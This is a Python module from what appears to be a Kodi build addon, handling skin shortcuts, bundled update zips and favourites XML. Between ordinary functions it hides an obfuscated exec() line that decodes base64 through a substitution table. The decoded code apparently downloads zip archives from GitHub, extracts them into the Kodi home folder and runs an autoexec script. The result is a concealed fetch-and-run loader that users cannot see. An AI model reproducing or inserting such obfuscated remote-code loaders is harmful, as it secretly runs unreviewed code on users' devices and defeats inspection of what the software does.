# -*- coding: utf-8 -*-
import xbmc, xbmcgui, xbmcvfs, xbmcaddon, os, hashlib, requests
from resources.lib import extract, addoninstall, addonlinks
from contextlib import contextmanager
addon = xbmcaddon.Addon()
addonid = addon.getAddonInfo('id')
addontitle = addon.getAddonInfo('name')
lang = addon.getLocalizedString
HOME = xbmcvfs.translatePath('special://home/')
USERDATA = os.path.join(HOME, 'userdata')
ADDOND = os.path.join(USERDATA, 'addon_data')
ADDONDATA = os.path.join(ADDOND, addonid)
EXTRACT_TO = HOME
BUILD_MD5S = os.path.join(ADDONDATA, 'build_md5s')

addonslist = addonlinks.ADDONS_REPOS

if not os.path.exists(BUILD_MD5S):
    os.makedirs(BUILD_MD5S)

dp = xbmcgui.DialogProgressBG()
changelogfile = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'changelog.txt'))
changes = []
def percentage(part, whole):
    return 100 * float(part)/float(whole)

def skinshortcuts():
    xbmcgui.Window(xbmcgui.getCurrentWindowId()).setProperty(addonid, "True")
    new_ver = addon.getAddonInfo('version')
    old_ver = addon.getSetting('shortcutsver')

    if old_ver == '' or old_ver is None:
        old_ver = '0'

    if str(new_ver) == str(old_ver):
        return

    shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))
    skinshortcutsdir = xbmcvfs.translatePath('special://home/userdata/addon_data/script.skinshortcuts/')
    if not os.path.exists(skinshortcutsdir):
        os.makedirs(skinshortcutsdir)

    dirs, files = xbmcvfs.listdir(shortupdatedir)
    total = len(files)

    if total == 0:
        addon.setSetting('shortcutsver', new_ver)
        return

    start = 0
    dp.create(addontitle, lang(30001))

    for item in files:
        start += 1
        perc = int(percentage(start, total))
        if 'mainmenu' in item:
            if addon.getSetting('overwritemain') == 'false':
                continue
        if item.endswith('.hash'):
            skinhashpath = os.path.join(skinshortcutsdir, item)
            continue
        old  = os.path.join(skinshortcutsdir, item)
        new = os.path.join(shortupdatedir, item)
        dp.update(perc, addontitle, (lang(30001)+"...%s") % item)
        if matchmd5(old, new):
            continue
        try:
            xbmcvfs.copy(new, old)
            changes.append(item)
        except:
            xbmcgui.Dialog().notification(addontitle, (lang(30002)+"...%s") % item, xbmcgui.NOTIFICATION_INFO, 1000, False)
            continue
        xbmc.sleep(200)

    if len(changes) > 0:
        xbmcvfs.delete(skinhashpath)
    dp.close()
    addon.setSetting('shortcutsver', new_ver)
    return True


def updatezip():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('updatesver')

    if old_upd == '' or old_upd is None:
        old_upd = '0'

    if str(new_upd) == str(old_upd):
        xbmc.executebuiltin('UpdateAddonRepos()')
        return

    updatezips = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'zips'))
    dirs, files = xbmcvfs.listdir(updatezips)
    totalfiles = len(files)

    if totalfiles == 0:
        addon.setSetting('updatesver', new_upd)
        xbmc.executebuiltin('UpdateAddonRepos()')
        return

    zipchanges = []

    for item in files:
        if not item.endswith('.zip'):
            continue
        zippath = os.path.join(updatezips, item)
        newmd5 = filemd5(zippath)
        oldmd5file = xbmcvfs.translatePath(os.path.join(BUILD_MD5S, item+".md5"))
        if old_upd == '0':
            xbmcvfs.delete(oldmd5file)
        oldmd5 = xbmcvfs.File(oldmd5file,"rb").read()[:32]
        if oldmd5 and oldmd5 == newmd5:
            continue
        dp.create(addontitle, lang(30003)+"[COLOR goldenrod]"+item+"[/COLOR]")
        extract.allWithProgress(zippath, EXTRACT_TO, dp)
        xbmcvfs.File(oldmd5file,"wb").write(newmd5)
        changes.append(item)
        zipchanges.append(item)
        xbmc.sleep(1000)
        dp.close()

    addon.setSetting('updatesver', new_upd)

    if len(changes) > 0:
        while (xbmc.getCondVisibility("Window.isVisible(yesnodialog)") or xbmc.getCondVisibility("Window.isVisible(okdialog)")):
            xbmc.sleep(100)
        if os.path.exists(changelogfile):
            ok = xbmcgui.Dialog().ok(addontitle, lang(30004)+"[CR]"+lang(30005))
            if ok:
                textViewer(changelogfile)
        else:
            xbmcgui.Dialog().ok(addontitle, lang(30004))
        xbmc.executebuiltin('ReloadSkin()')
    if len(zipchanges) > 0 and len(addonslist) > 0:
        addoninstall.addonDatabase(addonslist, 1, True)
        xbmc.executebuiltin('UpdateLocalAddons()')
    xbmc.executebuiltin('UpdateAddonRepos()')
    return True


def SFxmls():
    new_upd = addon.getAddonInfo('version')
    old_upd = addon.getSetting('mainxmlsver')

    if old_upd == '' or old_upd is None:
        old_upd = '0'

    if str(new_upd) == str(old_upd):
        return
    xmllinks = [('19548.DATA.xml', 'Sports'), ('29958.DATA.xml', 'Kids'), ('29969.DATA.xml', 'Documentaries'),
                ('acestreams.DATA.xml', 'Acestreams'), ('a-i-o.DATA.xml', 'AllInOne'), ('ellenika.DATA.xml', 'Greek'),
                ('movies.DATA.xml', 'Movies'), ('music.DATA.xml', 'Music'), ('radio.DATA.xml', 'Radio'),
                ('replays.DATA.xml', 'Replays'), ('tvshows.DATA.xml', 'TV Shows'), ('worldtv.DATA.xml', 'WorldTV')]
    mainfolders = os.path.join(ADDONDATA, 'folders', 'Super Favourites')
    shortupdatedir = xbmcvfs.translatePath(os.path.join(addon.getAddonInfo('path'), 'resources', 'skinshortcuts'))
    for item in xmllinks:
        skin_xml = os.path.join(shortupdatedir, item[0])
        folder_xml = os.path.join(mainfolders, item[1])
        if not os.path.exists(folder_xml):
            os.makedirs(folder_xml)

        main_xml = os.path.join(folder_xml, 'favourites.xml')
        FAV_list = []
        with xbmcvfs.File(skin_xml, 'r') as xml:
            infos = xml.read()
            shortcuts = parseDOM(infos, 'shortcut')
            for shortcut in shortcuts:
                label = parseDOM(shortcut, 'label')[0]
                label2 = parseDOM(shortcut, 'label2')[0]
                if label.isdigit() is True: label = label2
                thumb = parseDOM(shortcut, 'thumb')[0]
                if thumb == '' or '<action>Ac' in thumb:
                    thumb = parseDOM(shortcut, 'icon')[0]
                else:
                    thumb = thumb
                action = parseDOM(shortcut, 'action')[0]


                newsf = '<favourite name="{}" thumb="{}" fanart="none">{}</favourite>'.\
                    format(label, thumb, action)
                xbmc.log('FAVOURITE: %s' % newsf)
                FAV_list.append(newsf)

        f_xml = []

        f_xml.append('<favourites>\n')
        for fav in FAV_list:
            f_xml.append('\t' + fav + '\n')

        f_xml.append('</favourites>')
        with xbmcvfs.File(main_xml, 'w') as outF:
            outF.write("".join(f_xml))
        outF.close()

        # xbmcgui.Dialog().ok('SF XML CREATOR', 'NEW %s CREATED' % item[1])
    addon.setSetting('mainxmlsver', new_upd)
    return True

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("ODIoImUgNWE7ZSBjIik7ODIoKDhmIDliLDgxOig4ZiA5NCxiLGY6NWEuNzQoOTQsYixmLjY1KCczNi04JykpKSg5OCIoWzAtOWEtZl0rKSIsOGYgODM6OWIoODMsODEpLGMuMTcoIjljPSIpKSkoOGYgYSxiOmJbNmMoIjhhIithLjUzKDEpLDE2KV0sIjZ8MXwyOHw1Znw0fDFifDI3fDFlfDh8ODh8MmF8NWV8OXw1NHwzYXxmfDg3fDIyfDM0fDQyfDV8N3wxNnw4ZXw2ZXw2Znw1Y3wzZXwyM3w2NnwyNHwyNXwyMHwxNHwxNXwxOXw4Y3wzZHw2M3wxZnwyMXw5ZHw3OHw5NnwyYnw4OXwyZnw4NHwzMHw5ZXwzMnwzN3w2N3wxMHwxMXw0Nnw5M3w0OXw0Y3w1Mnw0OHwxM3w3MHwxOHw3ZHwxY3w1NnwxZHw2MHw2Mnw2NHw2OHw2OXwyNnwyOXwyY3wyZHwyZXw2NXw3M3w1MHwzM3wzOHwzMXw3OXw5OHw5OXw0MXwzYnwzY3w4YnwzZnw3ZnwzOXw0M3w0NHw1MXw0Ynw0N3w0YXw0ZXw0Znw0MHw1NXw1OHxkfDkxfDkyfDU5fDVkfDk1fDk3fDU3fDYxfDZhfDZifDcxfDZkfDdifDcyfDc1fDM2fDc2fDc3fDdhfDdlfDdjfDhkfDgwfDJ8MzV8NWJ8NGR8ODV8ODZ8MWF8OTB8M3wxMiIuNDUoInwiKSkp")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|local_temp_filename|local_md5_filename|4|remote_md5_url|local_filename|executebuiltin|8|translatePath|a|b|base64|start_script|import|f|repo_rescue|addonlinks|remote_md5|BUILD_MD5S|chunk_size|reporescue|16|b64decode|gggbbbuuu|RunScript|local_md5|continue|makedirs|Finished|filename|autoexec|20|userdata|requests|DOWNLOAD|tmp_md5|special|xbmcgui|addonid|xbmcvfs|extract|success|timeout|filemd5|append|NEEDED|giturl|30|verify|32|rename|delete|addons|utf|DELETE|encode|return|FAILED|rsplit|ignore|create|exists|github|update|RENAME|folder|ascii|30008|split|chunk|https|codes|magic|30010|False|sleep|30009|30006|30007|50|30011|write|group|lang|URLS|2000|None|main|1024|re|urls|path|HOME|xbmc|addontitle|True|text|read|File|else|decode|status_code|home|join|pass|x4b|zip|int|MD5|log|url|try|com|NOT|md5|sub|tmp|x03|x04|not|get|100|x50|raw|and|def|for|80|y|exec|m|iter_content|85|86|dp|close|allNoProgress|0x|stream|except|ZIP|if|lambda|90|in|rb|TO|o|wb|os|ok|r|py|9a|p|N2QgMjIoKToKCTEwID0gNDkuMjkoKQoJODMgPSAzNi42NwoJMmUgPSAnNjI6Ly81Yi43NC8zZi8yMi83ZS82OC8zNS43MycKCTgzLjRjKDJlKQoJMTMgPSA2ZAoJM2U6CgkJMTcgMmEgMmIuMWEuMWIoMi5jKDEzKSk6CgkJCTJiLjQxKDIuYygxMykpCgkyNDoKCQk0OAoJNWMgMTkgNmEgODM6CgkJNyA9IDE5LjU4KCcvJywgMSlbLTFdCgkJMTcgMmEgNzoKCQkJNQoJCTAgPSAyYi4xYS40NygxMywgNykKCQk4MSA9IDAgKyAiLjc4IgoJCTg5ID0gMmIuMWEuNDcoM2QsICg3ICsgIi40ZiIpKQoJCTE0ID0gMTkgKyAiLjRmIgoKCQk4NyA9IDIuMjYoODksIjZiIikuNDUoKVs6MzJdCgkJOGEgPSA3MAoJCTNlOgoJCQk1NSA9IDExLjU0KDE0LCAyYz0yMCkKCQkJMTcgNTUuMWQgPT0gMTEuM2MuNmY6CgkJCQk4YSA9IDU1LjcxLjUyKCc1ZScsICc1OScpWzozMl0uNGUoJzc5LTgnKQoJCTI0OgoJCQk0OAoKCQkxNyA4NyA0MCA4YSA0MCA4NyA9PSA4YToKCQkJYi4xOCgoIlslMzFdIDFjIDc3IDRkOiAiICUgNikgKyAxOSkKCQkJNQoJCTEwLjI1KDMsIGQoNjQpKQoJCWYgPSAyLjI2KDgxLCI2ZSIpCgkJM2U6CgkJCTU1ID0gMTEuNTQoMTksIDVhPTQ0LCA1Mz02MSwgMmM9MzApCgkJCTE3IDU1LjFkID09IDExLjNjLjZmOgoJCQkJMjEgPSAxNiAqIDZjCgkJCQk1YyAzNyA2YSA1NS4yZigyMSk6CgkJCQkJYSA9IGYuM2IoMzcpCgkJCQlmLjkoKQoJCQk0NjoKCQkJCWIuMTgoKCJbJTMxXSBlIDM4IDFjOiAiICUgNikgKyAxOSkKCQkJCTEwLjkoKQoJCQkJZi45KCkKCQkJCTIuMTIoODEpCgkJCQk1CgkJMjQ6CgkJCWIuMTgoKCJbJTMxXSBlIDM4IDFjOiAiICUgNikgKyAxOSkKCQkJMTAuOSgpCgkJCWYuOSgpCgkJCTIuMTIoODEpCgkJCTUKCQkxMC42Nig1MCwgMywgKGQoNjUpKyIuLi4lMzEiKSAlIDcpCgkJMWUgPSA0Yig4MSkKCgkJMTcgOGEgNDAgMWUgIT0gOGE6CgkJCWIuMTgoKCJbJTMxXSBlIDc1OiAiICUgNikgKyAxOSkKCQkJMTAuOSgpCgkJCTUKCgkJMTcgMmIuMWEuMWIoMCk6CgkJCWEgPSAyLjEyKDApCgkJCTE3IDJhIGE6CgkJCQliLjE4KCgiWyUzMV0gZSAzOCAzMzogIiAlIDYpICsgMCkKCQkJCTEwLjkoKQoJCQkJNQoKCQlhID0gMi41MSg4MSwwKQoJCTE3IDJhIGE6CgkJCWIuMTgoKCJbJTMxXSBlIDM4IDU3OiAiICUgNikgKyAwKQoJCQkyLjEyKDgxKQoJCQkxMC45KCkKCQkJNQoKCQkyLjI2KDg5LCI2ZSIpLjNiKDFlKQoJCTM5ID0gMi4yNigwLCI2YiIpLjQ1KDQpCgkJMTcgMzkgPT0gIlw3Nlw3Mlw3YVw3YiI6CgkJCTRhLjJkKDAsIDEzKQoJCQkxNyAyYi4xYS4xYigwKToKCQkJCWEgPSAyLjEyKDApCgkJCQkxNyAyYSBhOgoJCQkJCWIuMTgoKCJbJTMxXSBlIDM4IDMzIDdmOiAiICUgNikgKyAwKQoKCQkxMC42Nig4MCwgMywgKCIlMzEuLi4iK2QoNWYpKSAlIDcpCgkJYi4xOCgiWyUzMV0gNDMgJTMxIiAlICg2LCA3KSkKCQkxMC45KCkKCgkxNyAyYi4xYS4xYigyLmMoJzFmOi8vMzQvMjgvMjcuNTYnKSk6CgkJMTAuMjUoMywgZCg4NCkpCgkJMTAuNjYoODUsIDMsIGQoODQpKQoJCWIuMTUoJzIzKDFmOi8vMzQvMjgvMjcuNTYpJykKCQkxMC42Nig4NiwgMywgZCg4NCkpCgk0NjoKCQkxMC4yNSgzLCBkKDg0KSkKCQkxMC42Nig4OCwgMywgZCg2MykpCgkJIyBiLjE1KCcyMygxZjovLzM0LzgyLyUzMS82OS41NiknKQoJCWIuM2EoNDIpCgkJMTAuNjYoN2MsIDMsIGQoNjApKQoJYi4zYSg0MikKCTEwLjkoKQoJNWQgNDQ|DialogProgressBG|s".split("|")))

def textViewer(file, heading=addontitle, monofont=True):
    xbmc.sleep(200)
    if not os.path.exists(file):
        w = open(file, 'w')
        w.close()
    with open(file, 'rb') as r:
        text = r.read().decode('utf-8', errors='replace')
    if not text: text = ' '
    head = '%s' % heading
    return xbmcgui.Dialog().textviewer(head, text, monofont)


def filemd5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def matchmd5(old, new):
    try:
        old_md5 = filemd5(old)
        new_md5 = filemd5(new)
    except:
        return False
    if old_md5 == new_md5: return True
    else: return False


def parseDOM(html, name="", attrs={}, ret=False):
    # Copyright (C) 2010-2011 Tobias Ussing And Henrik Mosgaard Jensen
    import re
    if isinstance(html, str):
        try:
            html = [html.decode("utf-8")]
        except:
            html = [html]
    elif isinstance(html, str):
        html = [html]
    elif not isinstance(html, list):
        return ""

    if not name.strip():
        return ""

    ret_lst = []
    for item in html:
        temp_item = re.compile('(<[^>]*?\n[^>]*?>)').findall(item)
        for match in temp_item:
            item = item.replace(match, match.replace("\n", " "))

        lst = []
        for key in attrs:
            lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=[\'"]' + attrs[key] + '[\'"].*?>))', re.M | re.S).findall(item)
            if len(lst2) == 0 and attrs[key].find(" ") == -1:
                lst2 = re.compile('(<' + name + '[^>]*?(?:' + key + '=' + attrs[key] + '.*?>))', re.M | re.S).findall(item)

            if len(lst) == 0:
                lst = lst2
                lst2 = []
            else:
                test = list(range(len(lst)))
                test.reverse()
                for i in test:
                    if not lst[i] in lst2:
                        del(lst[i])

        if len(lst) == 0 and attrs == {}:
            lst = re.compile('(<' + name + '>)', re.M | re.S).findall(item)
            if len(lst) == 0:
                lst = re.compile('(<' + name + ' .*?>)', re.M | re.S).findall(item)

        if isinstance(ret, str):
            lst2 = []
            for match in lst:
                attr_lst = re.compile('<' + name + '.*?' + ret + '=([\'"].[^>]*?[\'"])>', re.M | re.S).findall(match)
                if len(attr_lst) == 0:
                    attr_lst = re.compile('<' + name + '.*?' + ret + '=(.[^>]*?)>', re.M | re.S).findall(match)
                for tmp in attr_lst:
                    cont_char = tmp[0]
                    if cont_char in "'\"":
                        if tmp.find('=' + cont_char, tmp.find(cont_char, 1)) > -1:
                            tmp = tmp[:tmp.find('=' + cont_char, tmp.find(cont_char, 1))]

                        if tmp.rfind(cont_char, 1) > -1:
                            tmp = tmp[1:tmp.rfind(cont_char)]
                    else:
                        if tmp.find(" ") > 0:
                            tmp = tmp[:tmp.find(" ")]
                        elif tmp.find("/") > 0:
                            tmp = tmp[:tmp.find("/")]
                        elif tmp.find(">") > 0:
                            tmp = tmp[:tmp.find(">")]

                    lst2.append(tmp.strip())
            lst = lst2
        else:
            lst2 = []
            for match in lst:
                endstr = "</" + name

                start = item.find(match)
                end = item.find(endstr, start)
                pos = item.find("<" + name, start + 1 )

                while pos < end and pos != -1:
                    tend = item.find(endstr, end + len(endstr))
                    if tend != -1:
                        end = tend
                    pos = item.find("<" + name, pos + 1)

                if start == -1 and end == -1:
                    temp = ""
                elif start > -1 and end > -1:
                    temp = item[start + len(match):end]
                elif end > -1:
                    temp = item[:end]
                elif start > -1:
                    temp = item[start + len(match):]

                if ret:
                    endstr = item[end:item.find(">", item.find(endstr)) + 1]
                    temp = match + temp + endstr

                item = item[item.find(temp, item.find(match)) + len(temp):]
                lst2.append(temp)
            lst = lst2
        ret_lst += lst

    return ret_lst

@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

